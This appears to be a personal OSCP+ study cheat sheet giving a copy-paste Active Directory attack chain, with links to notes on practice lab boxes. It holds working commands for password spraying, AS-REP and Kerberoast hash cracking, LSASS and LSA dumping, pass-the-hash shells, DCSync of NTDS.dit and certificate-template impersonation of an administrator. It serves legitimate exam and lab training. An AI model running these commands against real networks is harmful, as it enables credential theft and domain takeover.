# AD Kill-Chain (OSCP+ 40pt)

# Active Directory Kill-Chain (OSCP+ 40pt set)

Copy-paste AD workflow mined from your own Blackfield / Sauna / Forest / Administrator / Cicada / Active / Return boxes. OSCP+ guarantees a 3-host AD chain - treat this as the primary scoring path.

## 0. Fix clock skew FIRST (Kerberos fails otherwise)

```bash
sudo ntpdate <DC_IP>            # or:
sudo timedatectl set-ntp off && sudo rdate -n <DC_IP>
faketime "$(ntpdate -q <DC_IP> | ...)" <kerberos cmd>   # per-command skew fix
```

## 1. Unauthenticated / low-cred enumeration

```bash
nxc smb <DC_IP>                              # host + domain + signing
nxc smb <DC_IP> -u '' -p '' --shares         # null session shares
enum4linux-ng -A <DC_IP>
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
```

## 2. User discovery + AS-REP roast (no creds needed)

AS-REP / kerbrute practice: [Blackfield](https://app.notion.com/p/Blackfield-316c3dbf5cad80169dbeeb5533bdf461?pvs=21) · [Sauna](https://app.notion.com/p/Sauna-316c3dbf5cad8059a7b8e1574eb92d5e?pvs=21) · [Forest](https://app.notion.com/p/Forest-316c3dbf5cad80a4b26bd8949e798903?pvs=21)

```bash
kerbrute userenum --dc <DC_IP> -d <domain> users.txt
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## 3. With creds: spray, enumerate, BloodHound

```bash
nxc smb <subnet> -u user -p 'Pass' --continue-on-success        # spray
nxc smb <DC_IP> -u user -p 'Pass' --rid-brute                   # user list
nxc smb <target_IP> -u user -p 'Pass' --LSA                     # Dump LSA/Registry
nxc smb <target_IP> -u user -p 'Pass' -M Lssasy                 # Dump LSASS
bloodhound-python -u user -p 'Pass' -d <domain> -ns <DC_IP> -c All
# then import *.json into BloodHound, mark owned, run 'Shortest paths to DA'
```

## 4. Kerberoast (service accounts)

Kerberoast practice: [Administrator](https://app.notion.com/p/Administrator-316c3dbf5cad804b8f52feba36b35191?pvs=21) · [Active](https://app.notion.com/p/Active-316c3dbf5cad80cfa9abdafa8999bbec?pvs=21)

```bash
impacket-GetUserSPNs <domain>/user:'Pass' -dc-ip <DC_IP> -request
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

## 5. Lateral movement / shell

```bash
evil-winrm -i <IP> -u user -p 'Pass'
evil-winrm -i <IP> -u user -H <NTLM_hash>          # pass-the-hash
nxc smb <IP> -u user -H <hash> -x 'whoami'
impacket-psexec <domain>/user:'Pass'@<IP>
```

## 6. Dump domain (after DA / DCSync rights)

secretsdump / DCSync practice: [Blackfield](https://app.notion.com/p/Blackfield-316c3dbf5cad80169dbeeb5533bdf461?pvs=21) · [Administrator](https://app.notion.com/p/Administrator-316c3dbf5cad804b8f52feba36b35191?pvs=21) · [Cicada](https://app.notion.com/p/Cicada-316c3dbf5cad807fb642fe2a65e5fccf?pvs=21)

```bash
impacket-secretsdump <domain>/user:'Pass'@<DC_IP>
impacket-secretsdump -just-dc-user krbtgt <domain>/user:'Pass'@<DC_IP>
nxc smb <DC_IP> -u user -p 'Pass' --ntds            # dump NTDS.dit
```

## 7. AD CS / advanced (Certipy, shadow creds, delegation)

```bash
certipy find -u user@<domain> -p 'Pass' -dc-ip <DC_IP> -vulnerable
certipy req -u user@<domain> -p 'Pass' -ca <CA> -template <T> -upn administrator@<domain>
certipy auth -pfx Administrator.pfx -dc-ip <DC_IP>
# shadow credentials (GenericWrite over target):
pywhisker -d <domain> -u user -p 'Pass' --target victim --action add

```
